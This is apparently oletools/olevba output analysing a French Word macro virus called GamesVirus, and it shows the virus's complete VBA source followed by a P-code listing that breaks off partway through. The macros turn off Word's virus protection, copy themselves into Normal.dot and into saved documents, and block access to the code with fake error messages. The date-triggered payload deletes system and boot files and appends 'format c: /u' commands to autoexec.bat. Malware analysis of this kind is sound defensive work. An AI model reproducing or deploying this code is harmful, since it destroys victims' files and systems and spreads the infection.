olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.GamesVirus
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.GamesVirus - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO GamesVirus.bas 
in file: Virus.MSWord.GamesVirus - OLE stream: 'Macros/VBA/GamesVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAE
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
D$ = Mid(MyDate, 1, 2)
Ts$ = Mid(MyTime, 7, 8)
Tm$ = Mid(MyTime, 4, 2)
If D$ = "01" Then
Call PayLoad
End If
If Ts$ = "01" Then
    With Dialogs(wdDialogFileSummaryInfo)
        .Subject = "GamesVirus est avec vous, HAHAHAHAHA!!"
        .Execute
    End With
End If
If Tm$ = "01" Then
    StatusBar = "Remerciement à GamesVirus et à son auteur: ZeMacroKiller98"
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAO
IMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To IMacroCount
    If WordBasic.[MacroName$](i, 0) = "GamesVirus" Then
        bInstalled = -1
    End If
Next i
If Not bInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="GamesVirus", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm2", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm3", Object:=wdOrganizerObjectProjectItems
    MsgBox "GamesVirus dans NORMAL.DOT", vbCritical, "ZeMacroKiller98"
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="GamesVirus", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm2", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm3", Object:=wdOrganizerObjectProjectItems
End If

ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
        If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
     Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="GamesVirus", Object:=wdOrganizerObjectProjectItems
     Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
     Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm2", Object:=wdOrganizerObjectProjectItems
     Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm3", Object:=wdOrganizerObjectProjectItems
     ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    MsgBox "Fonction Sub inconnu", vbCritical, "Microsoft Word"
ErrorFT:
End Sub
Private Sub PayLoad()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorPL
Dim Reponse1$
Dim Reponse2$
Dim Reponse3$
MsgBox "On va jouer à un jeu...", vbCritical, "GamesVirus"
UserForm1.Show
UserForm2.Show
UserForm3.Show
Reponse1$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Rep1", "WINWORD8.INI")
Reponse2$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Rep2", "WINWORD8.INI")
Reponse3$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Rep3", "WINWORD8.INI")
If (Reponse1$ = 0) Or (Reponse2$ = 0) Or (Reponse3$ = 0) Then
    MsgBox "Tu n'as pas voulu répondre à mes questions...", vbInformation, "GamesVirus"
    Kill "c:\dos\*.*"
    Kill "c:\windows\*.ini"
    Kill "c:\windows\msgsrv32.exe"
    Kill "c:\windows\command\*.*"
    MsgBox "Tu vas le regretter...", vbCritical, "GamesVirus"
Else
    GoTo Apres
End If
Apres:
If (Reponse1$ = 1) And (Reponse2$ = 1) And (Reponse3$ = 1) Then
    MsgBox "T'as tout faux, mon pote!!!", vbCritical, "GamesVirus"
Open "C:\Autoexec.bat" For Append As #1
Print #1, "echo salut, C'est GamesVirus"
Print #1, "echo T'as eu faux a toutes mes questions!!!"
Print #1, "echo pour celà, je vais formater ton disque du c:..."
Print #1, "rem Version Anglais'"
Print #1, "echo y|format c: /u"
Print #1, "rem Version Française"
Print #1, "echo o|format c: /u"
Close #1
GoTo Fin
Else
    GoTo Suite
End If
Suite:
If (Reponse1$ = 2) And (Reponse2$ = 2) And (Reponse3$ = 2) Then
    MsgBox "Bravo, t'as tout trouvé!!!!!", vbExclamation, Title:="GamesVirus"
Message:
        StatusBar = "Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                                                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                                                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                                                                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                                                                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                                                                                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                                                                                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                                                                                                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                                                                                                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                                                                                                                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                                                                                                                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                                                                                                                                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        StatusBar = "                                                                                                                                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
        For i = 1 To 400000
        Next i
        GoTo Message
Else
    GoTo Autre
End If
Autre:
    MsgBox "T'as eu quelque(s) réponse(s) de fausse!!!" & Chr$(13) & "Dommage pour toi!!!", vbInformation, "GamesVirus"
    Kill "c:\autoexec.bat"
    Kill "c:\config.sys"
    Kill "c:\command.com"
    Kill "c:\msdos.sys"
    Kill "c:\io.sys"
    MsgBox "Bon redemarrage!!!!!" & Chr$(13) & "HAHAHAHAHA!", vbExclamation, "GamesVirus"
    GoTo Fin
Fin:

ErrorPL:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    MsgBox "accès refusé!!!!", vbCritical, "Microsoft Word"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: Virus.MSWord.GamesVirus - OLE stream: 'Macros/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Dim Reponse1$
Reponse1$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Rep1", "WINWORD8.INI")
WordBasic.SetPrivateProfileString "Microsoft Word", "Rep1", "1", "WINWORD8.INI"
Unload UserForm1
End Sub

Private Sub CommandButton2_Click()
Dim Reponse1$
Reponse1$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Rep1", "WINWORD8.INI")
WordBasic.SetPrivateProfileString "Microsoft Word", "Rep1", "2", "WINWORD8.INI"
Unload UserForm1
End Sub

Private Sub Userform_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Dim Reponse1$
Reponse1$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Rep1", "WINWORD8.INI")
WordBasic.SetPrivateProfileString "Microsoft Word", "Rep1", "0", "WINWORD8.INI"
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm2.frm 
in file: Virus.MSWord.GamesVirus - OLE stream: 'Macros/VBA/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Dim Reponse2$
Reponse2$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Rep2", "WINWORD8.INI")
WordBasic.SetPrivateProfileString "Microsoft Word", "Rep2", "1", "WINWORD8.INI"
Unload UserForm2
End Sub

Private Sub CommandButton2_Click()
Dim Reponse2$
Reponse2$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Rep2", "WINWORD8.INI")
WordBasic.SetPrivateProfileString "Microsoft Word", "Rep2", "2", "WINWORD8.INI"
Unload UserForm2
End Sub
Private Sub Userform_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Dim Reponse2$
Reponse2$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Rep2", "WINWORD8.INI")
WordBasic.SetPrivateProfileString "Microsoft Word", "Rep2", "0", "WINWORD8.INI"
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm3.frm 
in file: Virus.MSWord.GamesVirus - OLE stream: 'Macros/VBA/UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Dim Reponse3$
Reponse3$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Rep3", "WINWORD8.INI")
WordBasic.SetPrivateProfileString "Microsoft Word", "Rep3", "1", "WINWORD8.INI"
Unload UserForm3
End Sub

Private Sub CommandButton2_Click()
Dim Reponse3$
Reponse3$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Rep3", "WINWORD8.INI")
WordBasic.SetPrivateProfileString "Microsoft Word", "Rep3", "2", "WINWORD8.INI"
Unload UserForm3
End Sub
Private Sub Userform_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Dim Reponse3$
Reponse3$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Rep3", "WINWORD8.INI")
WordBasic.SetPrivateProfileString "Microsoft Word", "Rep3", "0", "WINWORD8.INI"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.GamesVirus
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/GamesVirus - 20788 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	OnError ErrorAE 
' Line #5:
' 	Dim 
' 	VarDefn MyDate
' 	VarDefn MyTime
' Line #6:
' 	Ld Date 
' 	St MyDate 
' Line #7:
' 	Ld Time 
' 	St MyTime 
' Line #8:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #9:
' 	Ld MyTime 
' 	LitDI2 0x0007 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	St Ts$ 
' Line #10:
' 	Ld MyTime 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St Tm$ 
' Line #11:
' 	Ld D$ 
' 	LitStr 0x0002 "01"
' 	Eq 
' 	IfBlock 
' Line #12:
' 	ArgsCall (Call) PayLoad 0x0000 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	Ld Ts$ 
' 	LitStr 0x0002 "01"
' 	Eq 
' 	IfBlock 
' Line #15:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #16:
' 	LitStr 0x0026 "GamesVirus est avec vous, HAHAHAHAHA!!"
' 	MemStWith Subject 
' Line #17:
' 	ArgsMemCallWith Execute 0x0000 
' Line #18:
' 	EndWith 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	Ld Tm$ 
' 	LitStr 0x0002 "01"
' 	Eq 
' 	IfBlock 
' Line #21:
' 	LitStr 0x003A "Remerciement à GamesVirus et à son auteur: ZeMacroKiller98"
' 	St StatusBar 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Label ErrorAE 
' Line #24:
' 	EndSub 
' Line #25:
' 	FuncDefn (Sub AutoOpen())
' Line #26:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #27:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #29:
' 	OnError ErrorAO 
' Line #30:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St IMacroCount 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld IMacroCount 
' 	For 
' Line #32:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x000A "GamesVirus"
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LitDI2 0x0001 
' 	UMi 
' 	St bInstalled 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	Ld bInstalled 
' 	Not 
' 	IfBlock 
' Line #37:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "GamesVirus"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #38:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserForm1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #39:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserForm2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #40:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserForm3"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #41:
' 	LitStr 0x001A "GamesVirus dans NORMAL.DOT"
' 	Ld vbCritical 
' 	LitStr 0x000F "ZeMacroKiller98"
' 	ArgsCall MsgBox 0x0003 
' Line #42:
' 	ElseBlock 
' Line #43:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "GamesVirus"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #44:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserForm1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #45:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserForm2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #46:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserForm3"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #47:
' 	EndIfBlock 
' Line #48:
' Line #49:
' 	Label ErrorAO 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub FileSaveAs())
' Line #52:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #53:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #54:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #55:
' 	OnError ErrorFSA 
' Line #56:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #57:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #58:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "GamesVirus"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #61:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserForm1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #62:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserForm2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #63:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserForm3"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #64:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #65:
' 	Label ErrorFSA 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub FileTemplates())
' Line #68:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #69:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #70:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #71:
' 	OnError ErrorFT 
' Line #72:
' 	LitStr 0x0014 "Fonction Sub inconnu"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #73:
' 	Label ErrorFT 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Private Sub PayLoad())
' Line #76:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #77:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #78:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #79:
' 	OnError ErrorPL 
' Line #80:
' 	Dim 
' 	VarDefn Reponse1
' Line #81:
' 	Dim 
' 	VarDefn Reponse2
' Line #82:
' 	Dim 
' 	VarDefn Reponse3
' Line #83:
' 	LitStr 0x0017 "On va jouer à un jeu..."
' 	Ld vbCritical 
' 	LitStr 0x000A "GamesVirus"
' 	ArgsCall MsgBox 0x0003 
' Line #84:
' 	Ld UserForm1 
' 	ArgsMemCall Show 0x0000 
' Line #85:
' 	Ld UserForm2 
' 	ArgsMemCall Show 0x0000 
' Line #86:
' 	Ld UserForm3 
' 	ArgsMemCall Show 0x0000 
' Line #87:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep1"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Reponse1$ 
' Line #88:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep2"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Reponse2$ 
' Line #89:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep3"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Reponse3$ 
' Line #90:
' 	Ld Reponse1$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld Reponse2$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld Reponse3$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #91:
' 	LitStr 0x002D "Tu n'as pas voulu répondre à mes questions..."
' 	Ld vbInformation 
' 	LitStr 0x000A "GamesVirus"
' 	ArgsCall MsgBox 0x0003 
' Line #92:
' 	LitStr 0x000A "c:\dos\*.*"
' 	ArgsCall Kill 0x0001 
' Line #93:
' 	LitStr 0x0010 "c:\windows\*.ini"
' 	ArgsCall Kill 0x0001 
' Line #94:
' 	LitStr 0x0017 "c:\windows\msgsrv32.exe"
' 	ArgsCall Kill 0x0001 
' Line #95:
' 	LitStr 0x0016 "c:\windows\command\*.*"
' 	ArgsCall Kill 0x0001 
' Line #96:
' 	LitStr 0x0016 "Tu vas le regretter..."
' 	Ld vbCritical 
' 	LitStr 0x000A "GamesVirus"
' 	ArgsCall MsgBox 0x0003 
' Line #97:
' 	ElseBlock 
' Line #98:
' 	GoTo Apres 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	Label Apres 
' Line #101:
' 	Ld Reponse1$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld Reponse2$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	Ld Reponse3$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #102:
' 	LitStr 0x001B "T'as tout faux, mon pote!!!"
' 	Ld vbCritical 
' 	LitStr 0x000A "GamesVirus"
' 	ArgsCall MsgBox 0x0003 
' Line #103:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "echo salut, C'est GamesVirus"
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "echo T'as eu faux a toutes mes questions!!!"
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "echo pour celà, je vais formater ton disque du c:..."
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "rem Version Anglais'"
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "echo y|format c: /u"
' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "rem Version Française"
' 	PrintItemNL 
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "echo o|format c: /u"
' 	PrintItemNL 
' Line #111:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #112:
' 	GoTo Fin 
' Line #113:
' 	ElseBlock 
' Line #114:
' 	GoTo Suite 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	Label Suite 
' Line #117:
' 	Ld Reponse1$ 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	Ld Reponse2$ 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	And 
' 	Ld Reponse3$ 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #118:
' 	LitStr 0x001C "Bravo, t'as tout trouvé!!!!!"
' 	Ld vbExclamation 
' 	LitStr 0x000A "GamesVirus"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #119:
' 	Label Message 
' Line #120:
' 	LitStr 0x0046 "Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #121:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #122:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #123:
' 	LitStr 0x004D "       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #124:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #125:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #126:
' 	LitStr 0x0055 "               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
